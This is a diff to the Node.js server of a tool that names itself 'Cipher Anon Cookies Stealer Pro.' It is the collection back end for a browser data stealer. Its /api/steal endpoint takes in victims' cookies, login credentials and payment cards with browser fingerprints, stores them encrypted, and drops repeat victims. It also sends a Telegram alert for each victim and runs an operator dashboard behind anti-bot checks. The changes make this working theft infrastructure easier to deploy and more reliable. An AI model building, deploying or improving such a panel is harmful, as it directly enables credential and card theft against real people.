@@ -1,5 +1,7 @@
 // ============================================================
-// SERVER.JS — Cipher Anon v2.0 (Railway Fix)
+// SERVER.JS — Cipher Anon Cookies Stealer Pro v2.0
+// Railway Ready — Full Environment Variable Support
+// Fixed: Dedup uses IP + userAgent + screen (no hostname)
 // ============================================================
 
 const express = require('express');
@@ -17,7 +19,7 @@ const app = express();
 const PORT = process.env.PORT || 3000;
 
 // ============================================================
-// CONFIGURATION
+// CONFIGURATION — Railway Friendly (Env Vars First)
 // ============================================================
 
 const CONFIG_FILE = path.join(__dirname, 'config.json');
@@ -27,6 +29,7 @@ function generateValidKey() {
 }
 
 function loadConfig() {
+    // Environment variables take priority
     const envConfig = {
         DASHBOARD_USERNAME: process.env.DASHBOARD_USERNAME || 'admin',
         DASHBOARD_PASSWORD: process.env.DASHBOARD_PASSWORD || 'SecurePass123',
@@ -36,30 +39,44 @@ function loadConfig() {
         SEND_NOTIFICATIONS: process.env.SEND_NOTIFICATIONS !== 'false',
     };
 
+    // Try to read config.json for persistence
     let fileConfig = {};
     if (fs.existsSync(CONFIG_FILE)) {
         try {
             fileConfig = JSON.parse(fs.readFileSync(CONFIG_FILE, 'utf8'));
-        } catch (e) {}
+            console.log('[+] Loaded config from file');
+        } catch (e) {
+            console.log('[!] Config file corrupt, using env vars');
+        }
     }
 
+    // Merge: env vars override file
     const merged = { ...fileConfig, ...envConfig };
+
+    // Validate encryption key
     const key = merged.ENCRYPTION_KEY;
     if (typeof key !== 'string' || key.length !== 64 || !/^[a-f0-9]{64}$/i.test(key)) {
+        console.log('[!] Invalid encryption key — generating new one');
         merged.ENCRYPTION_KEY = generateValidKey();
     }
 
+    // Save merged config back to file
     try {
         fs.writeFileSync(CONFIG_FILE, JSON.stringify(merged, null, 2));
-    } catch (e) {}
+    } catch (e) {
+        console.log('[!] Config file not writable — using env vars only');
+    }
 
     return merged;
 }
 
 const CONFIG = loadConfig();
 
+// Log config (hide sensitive data)
 console.log(`[+] Username: ${CONFIG.DASHBOARD_USERNAME}`);
 console.log(`[+] Password: ${CONFIG.DASHBOARD_PASSWORD.slice(0,3)}***`);
+console.log(`[+] Encryption Key: ${CONFIG.ENCRYPTION_KEY.slice(0,8)}...`);
+console.log(`[+] Telegram: ${CONFIG.SEND_NOTIFICATIONS ? 'ENABLED' : 'DISABLED'}`);
 
 // ============================================================
 // DATA FILES
@@ -74,7 +91,7 @@ const LOG_FILE = path.join(__dirname, 'steal.log');
 // ============================================================
 
 const SESSION_SECRET = process.env.SESSION_SECRET || crypto.randomBytes(32).toString('hex');
-const SESSION_MAX_AGE = 30 * 60 * 1000;
+const SESSION_MAX_AGE = 30 * 60 * 1000; // 30 minutes
 
 app.use(session({
     secret: SESSION_SECRET,
@@ -132,6 +149,7 @@ function decryptData(encryptedBase64) {
         const decrypted = Buffer.concat([decipher.update(encrypted), decipher.final()]);
         return JSON.parse(decrypted.toString());
     } catch (e) {
+        console.log('[!] Decryption failed:', e.message);
         return null;
     }
 }
@@ -146,6 +164,7 @@ function loadData(file) {
         const decrypted = decryptData(fs.readFileSync(file, 'utf8'));
         return decrypted || [];
     } catch (e) {
+        console.log(`[!] Failed to load ${file}:`, e.message);
         return [];
     }
 }
@@ -154,7 +173,8 @@ let stolenData = loadData(DATA_FILE);
 let trashData = loadData(TRASH_FILE);
 
 // ============================================================
-// DEDUP — Stronger: IP + hostname + userAgent hash
+// DEDUP — IP + userAgent + screen (NO hostname dependency)
+// FIXES duplicate issue when hostname is "unknown"
 // ============================================================
 
 const dedupCache = new Map();
@@ -167,20 +187,24 @@ function cleanDedup() {
     }
 }
 
-function getDedupKey(ip, hostname, userAgent) {
+function getDedupKey(ip, userAgent, screen) {
     let cleanIp = ip;
-    if (ip === '::1' || ip === '::ffff:127.0.0.1' || ip === '127.0.0.1') cleanIp = '127.0.0.1';
-    // Only use first 50 chars of userAgent to avoid too much variation
+    if (ip === '::1' || ip === '::ffff:127.0.0.1' || ip === '127.0.0.1') {
+        cleanIp = '127.0.0.1';
+    }
     const ua = (userAgent || '').slice(0, 50);
-    return crypto.createHash('md5').update(`${cleanIp}|${hostname}|${ua}`).digest('hex');
+    const scr = screen || 'unknown';
+    return crypto.createHash('md5').update(`${cleanIp}|${ua}|${scr}`).digest('hex');
 }
 
-function isDuplicate(ip, hostname, userAgent) {
-    const key = getDedupKey(ip, hostname, userAgent);
+function isDuplicate(ip, userAgent, screen) {
+    const key = getDedupKey(ip, userAgent, screen);
     cleanDedup();
     if (dedupCache.has(key)) {
         const ts = dedupCache.get(key);
-        if (Date.now() - ts < DEDUP_WINDOW) return true;
+        if (Date.now() - ts < DEDUP_WINDOW) {
+            return true;
+        }
     }
     dedupCache.set(key, Date.now());
     return false;
@@ -211,23 +235,23 @@ function requireAuth(req, res, next) {
 }
 
 // ============================================================
-// MIDDLEWARE
+// SERVER SETUP
 // ============================================================
 
 app.use(cors());
 app.use(express.json({ limit: '10mb' }));
 app.use(express.urlencoded({ extended: true }));
 
-// Anti-Bot
+// ---- ANTI-BOT (with IP whitelist disabled for public access) ----
 app.use(antiBot({
     STRENGTH: 'high',
     RATE_LIMIT_MAX: 10,
-    ALLOWED_IPS: []
+    ALLOWED_IPS: [] // Empty = no IP whitelist, everyone gets challenged
 }));
 
 app.post('/__verify', express.json(), handleVerify);
 
-// Security Headers
+// ---- SECURITY HEADERS ----
 app.use((req, res, next) => {
     res.setHeader('X-Content-Type-Options', 'nosniff');
     res.setHeader('X-Frame-Options', 'DENY');
@@ -236,11 +260,15 @@ app.use((req, res, next) => {
     res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate, private');
     res.setHeader('Pragma', 'no-cache');
     res.setHeader('Expires', '0');
+
+    if (req.path.endsWith('.html')) {
+        return res.status(404).send('Not Found');
+    }
     next();
 });
 
 // ============================================================
-// HEALTH CHECK
+// HEALTH CHECK — Railway uses this to keep app alive
 // ============================================================
 
 app.get('/health', (req, res) => {
@@ -328,6 +356,10 @@ function getFlagEmoji(countryCode) {
     return String.fromCodePoint(...codePoints);
 }
 
+// ============================================================
+// GENERATE UNIQUE ID
+// ============================================================
+
 function generateUniqueId(entry) {
     const domain = entry.fingerprint?.hostname || entry.domain || 'unknown';
     const ip = entry.ip || 'unknown';
@@ -365,7 +397,7 @@ app.get('/api/logout', (req, res) => {
     req.session.destroy((err) => {
         if (err) log(`[!] Logout error: ${err.message}`);
         res.clearCookie('connect.sid');
-        log('[+] User logged out');
+        log('[+] User logged out, session destroyed');
         res.redirect('/login.php');
     });
 });
@@ -394,10 +426,11 @@ app.post('/api/steal', async (req, res) => {
 
         const hostname = data.fingerprint?.hostname || data.domain || 'unknown';
         const userAgent = data.fingerprint?.userAgent || '';
+        const screen = data.fingerprint?.screen || '';
 
-        // ---- STRONG DEDUP CHECK ----
-        if (isDuplicate(ip, hostname, userAgent)) {
-            log(`[!] Duplicate from ${ip} for ${hostname} — ignored`);
+        // ---- STRONG DEDUP: IP + userAgent + screen (NO hostname) ----
+        if (isDuplicate(ip, userAgent, screen)) {
+            log(`[!] Duplicate from ${ip} — ignored`);
             return res.json({ status: 'ok', duplicate: true });
         }
 
@@ -410,8 +443,7 @@ app.post('/api/steal', async (req, res) => {
         const cardCount = data.cards.length;
 
         log(`[+] ${hostname} — ${count} cookies, ${credCount} creds, ${cardCount} cards | ${ip}`);
-        
-        sendTelegram(hostname, count, ip, countryInfo, credCount, cardCount).catch(() => {});
+        await sendTelegram(hostname, count, ip, countryInfo, credCount, cardCount);
 
         res.json({ status: 'ok', country: countryInfo });
     } catch (e) {
@@ -544,10 +576,12 @@ app.post('/api/change-password', requireAuth, (req, res) => {
     }
 
     CONFIG.DASHBOARD_PASSWORD = newPassword;
+    // Save to config.json
     try {
         fs.writeFileSync(CONFIG_FILE, JSON.stringify(CONFIG, null, 2));
-    } catch (e) {}
-
+    } catch (e) {
+        log(`[!] Failed to save config: ${e.message}`);
+    }
     log('[+] Password changed successfully');
 
     req.session.destroy((err) => {
@@ -585,9 +619,12 @@ app.post('/api/config/telegram', requireAuth, (req, res) => {
     CONFIG.TELEGRAM_CHAT_ID = chatId;
     CONFIG.SEND_NOTIFICATIONS = notifications !== undefined ? notifications : true;
 
+    // Save to config.json
     try {
         fs.writeFileSync(CONFIG_FILE, JSON.stringify(CONFIG, null, 2));
-    } catch (e) {}
+    } catch (e) {
+        log(`[!] Failed to save config: ${e.message}`);
+    }
 
     log('[+] Telegram config updated');
     res.json({ status: 'ok', message: 'Telegram settings updated successfully' });
@@ -597,6 +634,7 @@ app.post('/api/config/telegram', requireAuth, (req, res) => {
 // FRONTEND ROUTES
 // ============================================================
 
+// ---- Public Routes (No Auth Required) ----
 app.get('/', (req, res) => {
     res.sendFile(path.join(__dirname, 'public', 'home.php'));
 });
@@ -614,6 +652,7 @@ app.get('/home.php', (req, res) => {
     res.sendFile(path.join(__dirname, 'public', 'home.php'));
 });
 
+// ---- Protected Routes (Auth Required) ----
 app.get('/dashboard', requireAuth, (req, res) => {
     res.setHeader('Content-Type', 'text/html; charset=utf-8');
     res.sendFile(path.join(__dirname, 'public', 'dashboard.php'));
@@ -624,9 +663,14 @@ app.get('/password-success.php', requireAuth, (req, res) => {
     res.sendFile(path.join(__dirname, 'public', 'password-success.php'));
 });
 
-// ---- Serve .php files with auth check ----
+// ============================================================
+// SERVE .PHP FILES — BLOCK DIRECT ACCESS
+// ============================================================
+
 app.get('*.php', (req, res, next) => {
     const filePath = path.join(__dirname, 'public', req.path);
+    
+    // Public .php files (no auth required)
     const publicPhp = ['/login.php', '/home.php'];
     
     if (publicPhp.includes(req.path)) {
@@ -637,6 +681,7 @@ app.get('*.php', (req, res, next) => {
         return next();
     }
     
+    // ALL other .php files require authentication
     if (!req.session || !req.session.authenticated) {
         return res.redirect('/login.php');
     }
@@ -655,7 +700,10 @@ app.get('*.php', (req, res, next) => {
     }
 });
 
-// ---- Static files fallback ----
+// ============================================================
+// STATIC FILES FALLBACK
+// ============================================================
+
 app.use((req, res, next) => {
     const filePath = path.join(__dirname, 'public', req.path);
     if (fs.existsSync(filePath) && !req.path.startsWith('/api')) {
@@ -665,7 +713,10 @@ app.use((req, res, next) => {
     next();
 });
 
-// ---- 404 Handler ----
+// ============================================================
+// 404 HANDLER
+// ============================================================
+
 app.use((req, res) => {
     if (req.path.startsWith('/api')) {
         res.status(404).json({ status: 'error', message: 'API endpoint not found' });
@@ -674,9 +725,13 @@ app.use((req, res) => {
     }
 });
 
-// ---- Error Handler ----
+// ============================================================
+// ERROR HANDLER
+// ============================================================
+
 app.use((err, req, res, next) => {
     console.error('[!] Error:', err.message);
+    console.error(err.stack);
     if (req.path.startsWith('/api')) {
         res.status(500).json({ status: 'error', message: err.message || 'Internal Server Error' });
     } else {
@@ -699,25 +754,26 @@ app.listen(PORT, '0.0.0.0', () => {
     console.log(`  [+] Health: http://localhost:${PORT}/health`);
     console.log(`  [+] Username: ${CONFIG.DASHBOARD_USERNAME}`);
     console.log(`  [+] Password: ${CONFIG.DASHBOARD_PASSWORD.slice(0,3)}***`);
-    console.log(`  [+] Dedup: IP + hostname + UA, 2min window`);
+    console.log(`  [+] Session Timeout: 30 minutes`);
+    console.log(`  [+] Dedup: IP + userAgent + screen, 2min window`);
     console.log(`  [+] Anti-Bot: ENABLED ✅`);
     console.log(`  [+] Telegram: ${CONFIG.SEND_NOTIFICATIONS ? 'ENABLED ✅' : 'DISABLED ❌'}`);
     console.log('='.repeat(55) + '\n');
 });
 
 // ============================================================
-// GRACEFUL SHUTDOWN
+// GRACEFUL SHUTDOWN — Save data on exit
 // ============================================================
 
 process.on('SIGINT', () => {
-    console.log('\n[!] Saving data...');
+    console.log('\n[!] Received SIGINT. Saving data...');
     saveData(DATA_FILE, stolenData);
     saveData(TRASH_FILE, trashData);
     process.exit(0);
 });
 
 process.on('SIGTERM', () => {
-    console.log('\n[!] Saving data...');
+    console.log('\n[!] Received SIGTERM. Saving data...');
     saveData(DATA_FILE, stolenData);
     saveData(TRASH_FILE, trashData);
     process.exit(0);
